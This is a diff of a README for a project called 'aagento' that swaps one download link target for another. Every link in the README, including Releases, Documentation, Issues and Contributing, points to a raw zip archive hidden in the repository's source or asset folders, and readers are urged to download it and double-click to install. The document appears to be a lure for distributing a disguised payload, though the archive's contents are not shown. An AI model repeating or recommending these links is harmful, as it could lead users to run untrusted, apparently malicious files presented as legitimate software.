@@ -1,10 +1,10 @@
 # 🚀 aagento - Build Responsive Applications Easily
 
-![Download aagento](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip)
+![Download aagento](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip)
 
 ## 📥 Download & Install
 
-To download and run the application, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip). This page contains the latest versions of aagento.
+To download and run the application, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip). This page contains the latest versions of aagento.
 
 ## 🌟 About aagento
 
@@ -29,7 +29,7 @@ To ensure aagento runs smoothly, make sure your system meets these requirements:
 ### 📖 How to Use aagento
 
 1. **Download the Application:**
-   Go to the [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip) and select the version you want to download.
+   Go to the [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip) and select the version you want to download.
    
 2. **Install:**
    After downloading the application, find the downloaded file on your computer. Double-click the file to start the installation process. Follow the installation prompts to complete the setup.
@@ -44,17 +44,17 @@ To ensure aagento runs smoothly, make sure your system meets these requirements:
 
 If you encounter any issues or have questions while using aagento, you can access the following resources:
 
-- **Documentation:** Detailed guides and FAQs are available on the [Documentation Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip).
+- **Documentation:** Detailed guides and FAQs are available on the [Documentation Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip).
 - **Community Support:** Join our community on platforms like Discord or Reddit to connect with other users and share tips.
-- **Issue Tracker:** Report bugs and issues directly on the [Issues Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip) of this repository.
+- **Issue Tracker:** Report bugs and issues directly on the [Issues Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip) of this repository.
 
 ### 🛡️ Maintaining Security
 
-Your safety is important. aagento automatically updates to the latest version for improved security. Be sure to download updates from the [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip) regularly.
+Your safety is important. aagento automatically updates to the latest version for improved security. Be sure to download updates from the [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip) regularly.
 
 ### 📝 Future Updates
 
-We regularly update aagento with new features and bug fixes. Stay tuned for updates announced on the [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip). Each update aims to enhance your experience and add valuable features.
+We regularly update aagento with new features and bug fixes. Stay tuned for updates announced on the [Releases Page](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip). Each update aims to enhance your experience and add valuable features.
 
 ### 🎨 Customizing aagento
 
@@ -72,7 +72,7 @@ aagento covers various topics to help you improve your web development skills. H
 
 ### 🌍 Contributions
 
-If you'd like to contribute to aagento, we welcome your input. Check out the [Contributing Guide](https://raw.githubusercontent.com/xMEDIyt/aagento/master/src/components/cards/aagento_plutonometamorphism.zip) for guidelines on how to get started.
+If you'd like to contribute to aagento, we welcome your input. Check out the [Contributing Guide](https://raw.githubusercontent.com/xMEDIyt/aagento/master/public/assets/teams/Software-v1.7.zip) for guidelines on how to get started.
 
 ### 📣 Acknowledgements
 
